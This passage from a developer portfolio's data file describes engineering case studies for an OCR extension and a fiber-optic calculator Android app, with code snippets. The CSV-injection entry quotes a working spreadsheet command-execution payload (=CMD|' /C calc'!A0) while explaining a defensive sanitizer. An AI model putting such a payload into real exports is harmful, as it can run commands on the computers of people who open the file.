      'In asynchronous JavaScript and WebAssembly architectures, boolean flags cannot serialize concurrent calls. Always use shared Promise handles as mutual exclusion locks so all callers safely await in-flight resource compilation.',
    sections: [
      {
        heading: 'Rapid Alt+T Invocations and Null Worker Crashes',
        content:
          'Pressing Alt+T in quick succession threw TypeError: Cannot read properties of null (reading recognize). The loading spinner froze permanently on screen, requiring a full extension reload.',
        type: 'mistake',
      },
      {
        heading: 'Boolean Flag Race Condition',
        content:
          'In offscreen.js, worker initialization used if (!ocrWorker && !isInitializing). While Tesseract compiled WASM dictionaries (800–1500ms), a second call saw isInitializing === true and skipped setup, immediately falling through to call recognize() on a null worker.',
        type: 'breakthrough',
      },
      {
        heading: 'Promise-Based Mutex Lock Implementation',
        content:
          'We replaced the boolean flag with workerInitPromise. Concurrent calls now await the active initialization promise, ensuring all callers safely await in-flight WASM compilation before executing OCR.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Init Latency', value: '800–1500 ms' },
      { label: 'Race Crashes', value: '0 Null Errors' },
      { label: 'OCR Engine', value: 'Tesseract WASM' },
    ],
    tags: ['WebAssembly', 'Chrome Manifest V3', 'Offscreen Canvas', 'Promise Mutex', 'Tesseract.js'],
    relatedProjectId: 'floating-translator',
    snippet: {
      title: 'Shared Promise Mutex for WASM Worker',
      language: 'javascript',
      code: `// Excerpt from: FloatingTranslator/extension/offscreen/offscreen.js
let workerInitPromise = null;

async function ensureWorker(lang) {
  if (ocrWorker && ocrWorkerLang === lang) return;
  if (workerInitPromise) {
    await workerInitPromise;
    if (ocrWorker && ocrWorkerLang === lang) return;
  }
  workerInitPromise = (async () => {
    if (ocrWorker) await ocrWorker.terminate();
    ocrWorker = await Tesseract.createWorker(lang, 1, {
      workerPath: chrome.runtime.getURL('lib/tesseract/worker.min.js'),
      corePath: chrome.runtime.getURL('lib/tesseract/tesseract-core.wasm.js'),
    });
    ocrWorkerLang = lang;
  })();
  try { await workerInitPromise; }
  finally { workerInitPromise = null; }
}`,
    },
  },

  // ==========================================
  // 7. AURABYTE (FIBEROPTICCALC FIELD CHRONICLES)
  // ==========================================
  {
    id: 'fibercalc-math-precision',
    title: 'The Floating-Point Drift: Why IEEE-754 Broke Optical Budgets',
    subtitle: 'Moving from binary float accumulation to a zero-dependency pure Kotlin Multiplatform math engine',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Jan – Aug 2026',
    readTime: '2 min read',
    badge: 'KMP · 0.00dB Drift',
    storyType: 'deep-dive',
    summary:
      'In Passive Optical Network (PON) engineering, optical power budgets are measured in decibel-milliwatts (dBm). When naive floating-point subtraction accumulated precision errors across cascaded splitters, and JVM BigDecimal broke iOS/Web builds, I engineered a zero-dependency pure Kotlin iterative math engine.',
    theMistake:
      'I migrated naive Double math to java.math.BigDecimal without considering cross-platform compilation. When porting our :core module to iOS and Kotlin/JS, java.math.* completely broke Kotlin Native builds.',
    theLesson:
      'Never leak platform standard library classes (java.math.*, java.text.*) into domain business logic. Pure Kotlin arithmetic abstractions guarantee identical calculation results across Android, iOS, and Web.',
    sections: [
      {
        heading: 'The -22.000000000004 dBm Glitch',
        content:
          'Field technicians rely on optical power numbers to verify that customer ONTs receive light between -8 dBm and -27 dBm. Using standard Double subtraction across 12 cascaded splitter tiers produced floating-point drift like -22.000000000004 dBm. Switching to java.math.BigDecimal solved Android precision, but completely broke our Kotlin Multiplatform (:core) build when compiling for iOS and Web.',
        type: 'mistake',
      },
      {
        heading: 'Pure Kotlin Iterative Stack Engine',
        content:
          'I replaced recursive tree traversal with an iterative, stack-based DFS engine in NetworkEngine.kt to eliminate stack overflows on 100+ node networks. I built MathUtils using pure Kotlin arithmetic (kotlin.math.round) with zero Java dependencies, allowing the same calculation engine to power Android and Next.js 15 Web via Kotlin/JS with 100% parity.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Optical Precision', value: '2 Decimals' },
      { label: 'Shared Targets', value: '3 (JVM/iOS/JS)' },
      { label: 'Math Drift', value: '0.00 dB' },
    ],
    tags: ['Kotlin Multiplatform', 'IEEE-754', 'KMP :core', 'Next.js 15', 'Math Engine'],
    relatedProjectId: 'fiberopticcalc',
    snippet: {
      title: 'Pure KMP Iterative Power Calculator',
      language: 'kotlin',
      code: `// Zero JVM dependency iterative stack DFS calculation engine
fun calculatePowerBudget(root: NetworkNode, inputDbm: Double): Map<String, PowerResult> {
    val results = mutableMapOf<String, PowerResult>()
    val stack = mutableListOf(NodeState(root, inputDbm))
    while (stack.isNotEmpty()) {
        val (node, powerIn) = stack.removeAt(stack.size - 1)
        val fiberLoss = MathUtils.roundTo(node.lengthKm * fiberLossPerKm, 2)
        val totalLoss = MathUtils.roundTo(fiberLoss + node.spliceLoss + node.insertionLoss, 2)
        val powerOut = MathUtils.roundTo(powerIn - totalLoss, 2)
        results[node.id] = PowerResult(powerIn, powerOut, totalLoss)
        node.children.reversed().forEach { stack.add(NodeState(it, powerOut)) }
    }
    return results
}`,
    },
  },
  {
    id: 'fibercalc-atomic-persistence',
    title: 'The Concurrency Ghost: Fixing Write-Inversion in Dispatchers.IO',
    subtitle: 'How an email about a corrupted survey in an underground vault forced me to master atomic persistence',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Feb – Aug 2026',
    readTime: '2 min read',
    badge: '5.73K+ Installs · 0.00% ANR',
    storyType: 'reflection',
    summary:
      'A technician in an underground vault lost a 2-hour fiber survey when his phone battery died. Investigating the root cause revealed a concurrency race condition in Dispatchers.IO where out-of-order writes and uncommitted file streams corrupted local JSON files.',
    theMistake:
      'I launched asynchronous file saves directly onto unconstrained Dispatchers.IO. Because it is a multi-threaded pool, rapid user edits allowed older snapshot coroutines to finish writing after newer ones, overwriting recent changes.',
    theLesson:
      'Never launch concurrent unconstrained I/O against local files. Enforce single-thread serialization (limitedParallelism(1)), write to a temp file first, and execute atomic kernel renames with fsync().',
    sections: [
      {
        heading: 'The Stinging Email from the Vault',
        content:
          'A fiber technician emailed me: "I was in an underground vault with no cell reception. The app closed when my battery dropped to 2%, and my 2-hour survey file was corrupted." Direct file.writeText() had left a half-written, unparseable JSON file on disk.',
        type: 'mistake',
      },
      {
        heading: 'Serialized Dispatcher & Atomic Rename',
        content:
          'I serialized all disk writes using Dispatchers.IO.limitedParallelism(1). Surveys are now serialized to a temporary .tmp file with a CRC32 checksum, flushed to physical flash storage via fsync(), and only then atomically renamed over the main database via the OS kernel. If power cuts at any millisecond, the previous valid survey remains 100% intact.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Total Installs', value: '5.73K+' },
      { label: 'ANR Rate', value: '0.00%' },
      { label: 'Crash Rate', value: 'Sub-1.3%' },
    ],
    tags: ['Kotlin Coroutines', 'Dispatchers.IO', 'Atomic Storage', 'Play Store', 'Defensive Android'],
    relatedProjectId: 'fiberopticcalc',
    snippet: {
      title: 'Serialized Atomic File Persistence',
      language: 'kotlin',
      code: `// Serialized single-thread dispatcher + atomic kernel rename
class NetworkRepositoryImpl(private val context: Context) : NetworkRepository {
    private val writeDispatcher = Dispatchers.IO.limitedParallelism(1)

    override suspend fun saveNetworks(networks: List<FiberNetwork>) = withContext(writeDispatcher) {
        val json = jsonSerializer.encodeToString(networks)
        AtomicFileUtils.writeAtomically(
            targetFile = File(context.filesDir, "networks_data.json"),
            content = json
        )
    }
}`,
    },
  },
  {
    id: 'fibercalc-derived-stateflow',
    title: 'The Derived StateFlow Trap: Eliminating Dual Source of Truth',
    subtitle: 'Why maintaining separate mutable state flows between Canvas and Dashboard created state desync',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Feb – Aug 2026',
    readTime: '2 min read',
    badge: 'Zero Desync Architecture',
    storyType: 'deep-dive',
    summary:
      'Maintaining two independent MutableStateFlow instances (_networks and _currentNetwork) led to subtle desync bugs between the Canvas editor and Dashboard cards. Refactoring to a single reactive derived StateFlow solved state consistency permanently.',
    theMistake:
      'I kept two duplicate state flows in NetworkViewModel. Whenever an undo/redo action or cloud restore mutated _networks, developers had to manually remember to update _currentNetwork, leading to desynchronized UI screens.',
    theLesson:
      'Avoid duplicate mutable state flows representing different projections of the same entity. Establish a single immutable source of truth and derive secondary views reactively using combine().',
    sections: [
      {
        heading: 'The Dual Source of Truth Anti-Pattern',
        content:
          'When editing a node on the Canvas, components updated immediately. But navigating back to the Dashboard showed outdated component counts because _networks and _currentNetwork required manual double-mutation. Undoing a branch edit reverted one screen while leaving the other stale.',
        type: 'mistake',
      },
      {
        heading: 'Reactive Single Source of Truth',
        content:
          'I refactored the ViewModel to hold only _networks (the master list) and _selectedNetworkId. The active network (currentNetwork) is reactively derived using combine(_networks, _selectedNetworkId) and exposed via stateIn(SharingStarted.Eagerly). State desync became mathematically impossible.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Source of Truth', value: '1 Master Flow' },
      { label: 'Desync Bugs', value: 'Zero' },
      { label: 'Reactivity', value: 'Instant' },
    ],
    tags: ['Jetpack Compose', 'StateFlow', 'Kotlin Coroutines', 'MVI / MVVM', 'Reactive UI'],
    relatedProjectId: 'fiberopticcalc',
    snippet: {
      title: 'Derived StateFlow Pattern with combine()',
      language: 'kotlin',
      code: `// Single source of truth with derived reactive selection
private val _networks = MutableStateFlow<List<FiberNetwork>>(emptyList())
val networks: StateFlow<List<FiberNetwork>> = _networks.asStateFlow()

private val _selectedNetworkId = MutableStateFlow<String?>(null)

val currentNetwork: StateFlow<FiberNetwork?> = combine(_networks, _selectedNetworkId) { nets, selectedId ->
    if (selectedId == null) null else nets.find { it.id == selectedId }
}.stateIn(scope = viewModelScope, started = SharingStarted.Eagerly, initialValue = null)`,
    },
  },
  {
    id: 'fibercalc-otdr-traversal',
    title: 'The OTDR Reverse-Traversal: Reversing Light Pulses on Live Maps',
    subtitle: 'Tracing optical laser reflections to precise GPS coordinates across graph cycles and splitters',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Feb – Mar 2026',
    readTime: '2 min read',
    badge: '±2.0m Fault Pinpoint',
    storyType: 'war-story',
    summary:
      'An Optical Time-Domain Reflectometer (OTDR) measures the physical distance to a fiber cut. Converting that distance into an interactive GPS pin on OpenStreetMap/Google Maps required engineering a cycle-safe graph traversal engine with power-aware trunk heuristics.',
    theMistake:
      'I assumed network graphs were simple acyclic trees. When technicians modeled backup ring loops, recursive traversal entered an infinite loop, freezing the UI thread with an ANR.',
    theLesson:
      'Physical infrastructure is messier than textbook graph theory. Traversal algorithms in physical domain modeling must enforce visited-node cycle detection and acknowledge physical divergence points.',
    sections: [
      {
        heading: 'The Graph Cycle Freeze & Splitter Ambiguity',
        content:
          'When an underground cable breaks, an OTDR outputs a scalar distance (e.g. 1,420m). Tracing that distance through ring-protected lines caused infinite recursion. Furthermore, when reaching a 1:8 splitter, the pulse traveled down all 8 branches simultaneously — early code picked Branch 0 arbitrarily, dropping repair pins on the wrong street.',
        type: 'mistake',
      },
      {
        heading: 'Cycle Protection & Power-Aware Heuristics',
        content:
          'I integrated a visitedNodes set to abort cycles. For asymmetric couplers (90/10), the engine automatically follows the high-power THRU (90%) trunk line; for symmetric splitters, it halts and prompts the technician to pick the active leg, pinpointing faults to within ±2 meters.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Fault Accuracy', value: '±2.0 m' },
      { label: 'Traversal Latency', value: '<1.2 ms' },
      { label: 'Supported Maps', value: 'OSM & Google' },
    ],
    tags: ['Graph Algorithms', 'OTDR Fault Locator', 'GIS Mapping', 'OSMDroid', 'Google Maps'],
    relatedProjectId: 'fiberopticcalc',
    snippet: {
      title: 'Cycle-Protected Optical Fault Traversal',
      language: 'kotlin',
      code: `// Cycle-safe graph traversal with power-aware trunk heuristics
fun traceOtdrFault(startNode: NetworkNode, targetDistanceMeters: Double): LatLngPoint? {
    val visited = mutableSetOf<String>()
    var remainingMeters = targetDistanceMeters
    var current: NetworkNode? = startNode
    while (current != null && visited.add(current.id)) {
        val spanMeters = current.lengthKm * 1000.0
        if (remainingMeters <= spanMeters) {
            return interpolateGeoPoint(current.startGeo, current.endGeo, remainingMeters / spanMeters)
        }
        remainingMeters -= spanMeters
        current = when {
            current.isAsymmetricCoupler -> current.children.firstOrNull { it.portType == PortType.THRU_90 }
            current.children.size == 1 -> current.children.first()
            else -> null // Symmetric splitter prompts user branch selection
        }
    }
    return null
}`,
    },
  },
  {
    id: 'fibercalc-frankenstein-coordinates',
    title: 'The "Frankenstein Rect": Double-Zoom Coordinate Teleportation',
    subtitle: 'Fixing the exponential coordinate space offset in Jetpack Compose Canvas viewport centering',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Feb 2026',
    readTime: '2 min read',
    badge: '60fps Infinite Grid',
    storyType: 'deep-dive',
    summary:
      'Searching for a node ID caused the entire CAD canvas diagram to vanish off-screen. Diagnosing the bug revealed that screen-space bounding coordinates were being multiplied by the zoom factor twice.',
    theMistake:
      'I read the target node’s bounding rectangle in screen coordinates after graphicsLayer scaling had already applied 2.5x zoom, and then multiplied by zoom again in the camera centering formula.',
    theLesson:
      'Never mix transformed screen-space coordinates with logical layout coordinates. Always calculate camera offsets in unscaled logical layout space before applying viewport matrix transformations.',
    sections: [
      {
        heading: 'Canvas Teleportation into Black Space',
        content:
          'When searching for a node at 2.5x zoom and clicking the result, the viewport shot thousands of pixels into empty space. The camera formula read the scaled bounding box and applied zoom a second time, exponentially distorting the target translation offset.',
        type: 'mistake',
      },
      {
        heading: 'Unscaled Layout Separation & Infinite Grid',
        content:
          'I decoupled logical layout coordinates from graphicsLayer transformations, calculating camera offsets strictly in unscaled canvas coordinates. I also implemented an infinite 50dp background grid using drawWithCache and drawBehind to eliminate object allocations during 60fps panning.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Viewport Centering', value: 'Pixel-Perfect' },
      { label: 'Canvas Framerate', value: '60 fps' },
      { label: 'Allocations / Frame', value: '0 objects' },
    ],
    tags: ['Jetpack Compose', 'Canvas Graphics', 'Coordinate Spaces', 'drawWithCache', 'UI Performance'],
    relatedProjectId: 'fiberopticcalc',
  },
  {
    id: 'fibercalc-camera-oom',
    title: 'The High-Res Camera Heap Crash: Two-Pass Sub-Sampled Decoding',
    subtitle: 'Preventing 100MB+ uncompressed bitmap allocations from blowing past the 128MB Android process heap',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: '120MB → 6MB Heap',
    storyType: 'deep-dive',
    summary:
      'A 108MP/48MP photo is only ~12MB on disk as a JPEG, but decoding it with BitmapFactory into uncompressed ARGB_8888 pixels requires 190MB to 430MB of raw RAM. When shared survey files with high-res photos exceeded the 128MB ART heap limit on budget devices, I built a two-pass memory-safe decoding pipeline.',
    theMistake:
      'I confused compressed file size on disk (~12MB) with uncompressed bitmap memory in RAM (width × height × 4 bytes). Calling BitmapFactory.decodeFile() directly blew past the 128MB dalvik.vm.heapgrowthlimit on budget field devices.',
    theLesson:
      'Android apps don’t get all 2GB–3GB of phone RAM; the OS caps each app process to a strict 128MB–192MB heap. Always inspect image dimensions first with inJustDecodeBounds, calculate exact inSampleSize divisors, and decode using memory-efficient RGB_565 configs.',
    sections: [
      {
        heading: 'Compressed Disk JPEG vs 200MB+ Uncompressed RAM',
        content:
          'When lead engineers attached high-res site photos (48MP/108MP) to fiber splice nodes and shared the .fiber survey with technicians, opening the survey on 2GB–3GB RAM field devices threw instant OutOfMemoryErrors. Even though a JPEG is only 12MB on disk, a 48MP image (8,000 × 6,000) uncompresses into 8000 × 6000 × 4 bytes = 192MB of raw RAM — instantly blowing past Android’s 128MB per-app process heap limit (heapgrowthlimit).',
        type: 'mistake',
      },
      {
        heading: 'Two-Pass Sub-Sampled Bitmap Pipeline',
        content:
          'I implemented two-pass decoding in PhotoStorageManager.kt using BitmapFactory.Options. The first pass reads header dimensions with inJustDecodeBounds = true; the second pass calculates inSampleSize to scale the image down to 1920x1080 (~6MB) using Bitmap.Config.RGB_565 (2 bytes/pixel), eliminating OOM crashes across all devices.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Uncompressed RAM', value: '192MB → 6MB' },
      { label: 'Heap Safety', value: 'Sub-128MB' },
      { label: 'Decode Format', value: 'RGB_565' },
    ],
    tags: ['Android Memory', 'BitmapFactory', 'OutOfMemoryError', 'Sub-Sampling', 'ART Heap Limit'],
    relatedProjectId: 'fiberopticcalc',
    snippet: {
      title: 'Two-Pass Sub-Sampled Bitmap Decoder',
      language: 'kotlin',
      code: `// Two-pass memory-safe decoding bounding high-res photos to ~6MB
fun decodeSampledBitmapFromFile(file: File, reqWidth: Int = 1920, reqHeight: Int = 1080): Bitmap? {
    return try {
        val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        BitmapFactory.decodeFile(file.absolutePath, options)
        options.inSampleSize = calculateInSampleSize(options, reqWidth, reqHeight)
        options.inJustDecodeBounds = false
        options.inPreferredConfig = Bitmap.Config.RGB_565 // 2 bytes per pixel
        BitmapFactory.decodeFile(file.absolutePath, options)
    } catch (e: Throwable) {
        null
    }
}`,
    },
  },
  {
    id: 'fibercalc-csv-injection',
    title: 'CWE-1236 CSV Formula Injection in Field Engineering Reports',
    subtitle: 'Neutralizing spreadsheet command execution exploits in exported Bill of Materials files',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: 'CWE-1236 Patched',
    storyType: 'reflection',
    summary:
      'FiberOpticCalc exports Bill of Materials (BOM) to CSV for Excel. During a security audit, we discovered that user-entered node names starting with =, +, -, or @ could execute arbitrary commands in Microsoft Excel (CWE-1236).',
    theMistake:
      'I concatenated user input strings directly into comma-separated CSV rows without checking for spreadsheet formula execution triggers.',
    theLesson:
      'Every external export is an attack surface. Treat exported files with the same sanitization rigor as web inputs by prepending apostrophes to neutralize formula triggers.',
    sections: [
      {
        heading: 'The Spreadsheet Exploit Surface',
        content:
          'If a contractor opened an exported CSV report from a shared network where a malicious node was named =CMD|\' /C calc\'!A0 or +SUM(...), spreadsheet engines like Microsoft Excel and LibreOffice executed the formula, creating command execution and data exfiltration risks.',
        type: 'mistake',
      },
      {
        heading: 'Strict Formula Sanitization Layer',
        content:
          'I built a sanitization layer in CsvReportGenerator.kt that detects leading formula trigger characters (=, +, -, @, \\t, \\r) and prepends a single apostrophe (\'), forcing spreadsheet engines to treat all fields as literal string text.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Vulnerability', value: 'CWE-1236 Patched' },
      { label: 'Security Audit', value: 'Passed' },
      { label: 'Export Format', value: 'Safe CSV' },
    ],
    tags: ['App Security', 'CWE-1236', 'CSV Injection', 'Data Sanitization', 'Enterprise BOM'],
    relatedProjectId: 'fiberopticcalc',
    snippet: {
      title: 'CWE-1236 CSV Formula Sanitization',
      language: 'kotlin',
      code: `// Neutralize formula execution triggers in exported CSV engineering reports
fun sanitizeForCsv(cellValue: String): String {
    val formulaTriggers = charArrayOf('=', '+', '-', '@', '\\t', '\\r')
    val trimmed = cellValue.trim()
    return if (trimmed.isNotEmpty() && formulaTriggers.contains(trimmed[0])) {
        "'$trimmed" // Prepend single apostrophe to force Excel literal text
    } else {
        trimmed
    }
}`,
    },
  },
  {
    id: 'fibercalc-compose-recomposition',
    title: 'The 12fps Recomposition Stutter in 64-Port Splitters',
    subtitle: 'Decomposing a 1,400-line monolithic Composable into virtualized LazyColumn subcomponents',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: '12fps → 60fps Silky',
    storyType: 'deep-dive',
    summary:
      'Editing high-density 1:64 splitters dropped UI framerate to 12fps because a 1,400-line monolithic Column sheet recomposed every single port row on every keystroke. Migrating to LazyColumn and hoisting lambdas restored silky 60fps.',
    theMistake:
      'I built NodeEditSheet.kt as a single monolithic Column Composable. Typing a character into one text field triggered unskippable recompositions across all 64 port sub-items.',
    theLesson:
      'Never render dynamic multi-item forms in un-virtualized Column composables. Decompose complex forms into small, skippable subcomponents and virtualize lists with LazyColumn.',
    sections: [
      {
        heading: 'Typing Stutter in High-Density Splitters',
        content:
          'When configuring large 1:64 splitters or 288-core fiber ribbon closures, keyboard input lagged severely on mid-range devices. Android Studio Layout Inspector showed that typing a single character into a label caused all 64 port rows to recompose simultaneously.',
        type: 'mistake',
      },
      {
        heading: 'Virtualized Decomposition & Memoization',
        content:
          'I decomposed the 1,400-line file into isolated subcomponents (NodeEditHeader, EditorTextFields, NodePortRow). I migrated from Column to virtualized LazyColumn with stable keys, hoisted lambdas, and memoized loss calculations with remember(node.id), restoring silky 60fps.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Framerate', value: '12 → 60 fps' },
      { label: 'Max Splitter', value: '1:64 Ports' },
      { label: 'Recompositions', value: 'Minimal' },
    ],
    tags: ['Jetpack Compose', 'LazyColumn', 'Recomposition', 'Android Performance', 'UI Optimization'],
    relatedProjectId: 'fiberopticcalc',
  },
  {
    id: 'fibercalc-downsizing-wipe',
    title: 'The Silent Downsizing Wipe: Destructive Confirmation Barriers',
    subtitle: 'Preventing accidental splitter reduction from wiping downstream customer subtrees',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Feb 2026',
    readTime: '2 min read',
    badge: 'Zero Data Loss Guard',
    storyType: 'reflection',
    summary:
      'Changing a 1:8 splitter to a 1:4 splitter automatically sliced the child array, silently wiping active customer drop terminals on ports 5 through 8 without warning. Adding proactive confirmation barriers saved field engineers from accidental data loss.',
    theMistake:
      'I implemented port count changes as a simple array slice without checking if candidate pruned ports contained active downstream subtrees.',
    theLesson:
      'Hardware structural mutations in CAD tools must be non-destructive by default. Always inspect pruned branches and enforce destructive confirmation dialogs when child entities exist.',
    sections: [
      {
        heading: 'The Accidental 1:4 Tap Disaster',
        content:
          'During field testing, a technician accidentally tapped "1:4" instead of "1:8" on a central splitter. The calculation engine sliced the output array, permanently deleting 15 downstream customer drop terminals and miles of surveyed fiber without warning.',
        type: 'mistake',
      },
      {
        heading: 'Proactive BranchManagementDialog Barrier',
        content:
          'I created BranchManagementDialog in NodeEditSheet.kt. When downsizing any multi-port node, the sheet inspects candidate ports to be pruned. If child nodes exist, downsizing is blocked, forcing the user to explicitly move or delete those branches first.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Data Loss Risk', value: 'Zero' },
      { label: 'Downsize Guard', value: 'Active' },
      { label: 'Field Safety', value: '100%' },
    ],
    tags: ['Defensive UX', 'CAD Architecture', 'Data Integrity', 'Jetpack Compose', 'Field Safety'],
    relatedProjectId: 'fiberopticcalc',
  },
  {
    id: 'fibercalc-context-localization',
    title: 'The Compose Dynamic Localization Crash: ContextImpl Violation',
    subtitle: 'Why overriding LocalContext with ContextImpl stripped ActivityResultRegistryOwner and crashed the app',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: '7 Locales · 0 Crashes',
    storyType: 'deep-dive',
    summary:
      'To switch languages in Settings without restarting the device, overriding LocalContext with context.createConfigurationContext() stripped ActivityResultRegistryOwner, crashing photo attachments and Google Sign-In with an IllegalStateException.',
    theMistake:
      'I replaced Compose\'s LocalContext with a wrapped ConfigurationContext. Because ContextImpl is not an Activity, all activity result contracts (Camera, Auth) failed immediately.',
    theLesson:
      'Never replace LocalContext with a non-Activity context in root composables. Use attachBaseContext on Activity and provide localized configuration via CompositionLocalProvider(LocalConfiguration provides config).',
    sections: [
      {
        heading: 'The LocalActivityResultRegistryOwner Crash',
        content:
          'FiberOpticCalc supports 7 languages dynamically. To achieve instant translation switching, the initial code wrapped LocalContext in a configuration context. Tapping "Take Photo" or "Google Sign-In" crashed with IllegalStateException: No ActivityResultRegistryOwner was provided.',
        type: 'mistake',
      },
      {
        heading: 'Preserving MainActivity as LocalContext',
        content:
          'I preserved MainActivity as LocalContext.current, applied dynamic localization via attachBaseContext, and provided localized configurations via CompositionLocalProvider(LocalConfiguration provides localizedConfig), giving 100% stable runtime language switching.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Locales Supported', value: '7 Languages' },
      { label: 'Runtime Switching', value: 'Instant' },
      { label: 'Crash Rate', value: '0.00%' },
    ],
    tags: ['Jetpack Compose', 'i18n Localization', 'LocalContext', 'ActivityResultContracts', 'Android Lifecycles'],
    relatedProjectId: 'fiberopticcalc',
  },
  {
    id: 'fibercalc-ad-lifecycle',
    title: 'The Lock-Screen Black Overlay: Lifecycle-Guarded Ad Windows',
    subtitle: 'Fixing BadTokenException and pitch-black window overlays when full-screen ads load as the phone sleeps',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Aug 2026',
    readTime: '2 min read',
    badge: 'AdMob Lifecycle Gated',
    storyType: 'reflection',
    summary:
      'When an interstitial ad loaded right as a technician locked their phone, the ad SDK attempted to attach a window token to a destroyed activity, throwing BadTokenException and leaving a mysterious black overlay upon unlocking.',
    theMistake:
      'I displayed full-screen ads in asynchronous callbacks without verifying if the host Activity was currently in a resumed lifecycle state.',
    theLesson:
      'Always gate full-screen overlay presentations with lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED) to prevent window token crashes when devices sleep or rotate.',
    sections: [
      {
        heading: 'The Mysterious Black Screen on Unlock',
        content:
          'Field technicians reported that locking the phone while creating a design caused the screen to become pitch black upon unlocking, with only a floating close button visible. An ad callback had triggered right as the phone went to sleep, attaching to a destroyed window token.',
        type: 'mistake',
      },
      {
        heading: 'Strict Lifecycle State Gating',
        content:
          'I added configuration change filtering to AndroidManifest.xml and enforced strict lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED) checks in AdManager before showing any full-screen window, guaranteeing clean device resumes.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Window Crashes', value: '0 BadToken' },
      { label: 'Resume Experience', value: 'Seamless' },
      { label: 'Lifecycle Gate', value: 'State.RESUMED' },
    ],
    tags: ['AdMob', 'Android Lifecycle', 'BadTokenException', 'Defensive Android', 'Window Manager'],
    relatedProjectId: 'fiberopticcalc',
  },
  {
    id: 'fibercalc-map-reversion-leak',
    title: 'The 1-Hour Google Maps Auto-Reversion & Native Memory Leak',
    subtitle: 'Fixing OSMDroid 80MB bitmap leaks on rotation and enforcing exact-millisecond rewarded ad expiration',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Apr – Aug 2026',
    readTime: '2 min read',
    badge: '$0.00 Unexpected Billing',
    storyType: 'deep-dive',
    summary:
      'OSMDroid leaked 80MB of native bitmap memory per screen rotation, and Google Maps satellite access remained unlocked indefinitely when the 1-hour timer expired in the background. DisposableEffect lifecycle hooks and active coroutine timers solved both.',
    theMistake:
      'MapView instances were not hooked into Compose lifecycle disposal, and the map provider relied on passive checks rather than active coroutine timers to revert premium map access.',
    theLesson:
      'Never let native Android views escape Compose DisposableEffect disposal hooks, and enforce active time-based entitlement expiration jobs to prevent unauthorized API billing.',
    sections: [
      {
        heading: '80MB Rotation Leaks & Stuck Google Maps',
        content:
          'OSMDroid’s MapView leaked 80MB of native tile bitmaps on every device rotation, causing OutOfMemoryError on low-RAM phones. Meanwhile, users who unlocked Google Maps Satellite via a rewarded video ad stayed on Google Maps indefinitely after the 1-hour timer expired in the background.',
        type: 'mistake',
      },
      {
        heading: 'DisposableEffect Hooks & Active Coroutine Timers',
        content:
          'I wrapped MapView in DisposableEffect with explicit LifecycleEventObserver attachments (onResume, onPause, onDetach). In SettingsViewModel, I added scheduleGoogleMapsExpiryJob to automatically revert to OpenStreetMap the exact millisecond the 1-hour window expires, guaranteeing zero native leaks and $0.00 unexpected Google Cloud billing.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Tile Leaks', value: '0 MB' },
      { label: 'Google Maps API Cost', value: '$0.00 Unexpected' },
      { label: 'Reversion Engine', value: 'Millisecond Exact' },
    ],
    tags: ['OSMDroid', 'Google Maps SDK', 'DisposableEffect', 'Memory Leaks', 'Monetization'],
    relatedProjectId: 'fiberopticcalc',
  },
  {
    id: 'fibercalc-zero-dollar-cloud',
    title: 'Zero-Dollar Cloud: Scaling to 25K MAU on Free-Tier Firebase',
    subtitle: 'Eliminating 3.75M monthly database reads via Remote Config edge caching and write-only pipelines',
    category: 'Android & Mobile',
    categories: ['Android & Mobile'],
    date: 'Jan – Aug 2026',
    readTime: '2 min read',
    badge: '$0.00 Infra · 25K MAU',
    storyType: 'deep-dive',
    summary:
      'To operate sustainably at $0.00 infrastructure cost, I replaced real-time Firestore listeners (which threatened 3.75M reads/month at 25K MAU) with Remote Config edge caching and write-only telemetry pipelines with zero client reads.',
    theMistake:
      'Early architecture drafted real-time Firestore listeners for developer announcements and community polls. At 25,000 MAU, active listeners would generate 3.75 million reads per month, blowing past free tiers into recurring monthly bills.',
    theLesson:
      'Cost optimization is an architectural discipline. Leverage free distributed edge caches (Remote Config) for broadcasts and restrict database access to write-only pipelines to eliminate read-cost scaling.',
    sections: [
      {
        heading: 'The 3.75 Million Read Threat',
        content:
          'Setting up real-time Firestore listeners for developer broadcasts and feedback polls would blow past Firebase Spark tier limits (50,000 reads/day) within hours at 25,000 MAU, incurring steep monthly cloud bills on a solo utility app.',
        type: 'mistake',
      },
      {
        heading: 'Zero-Client-Read Edge Architecture',
        content:
          'I pushed broadcasts via Firebase Remote Config ($0 cost, unlimited cached client fetches). User feedback and poll submissions were routed to a write-only Firestore collection — achieving 0 client reads at scale and ensuring the app runs permanently at $0.00 server cost.',
        type: 'breakthrough',
      },
    ],
    metrics: [
      { label: 'Monthly Cloud Cost', value: '$0.00 / mo' },
      { label: 'Client Firestore Reads', value: '0 Reads' },
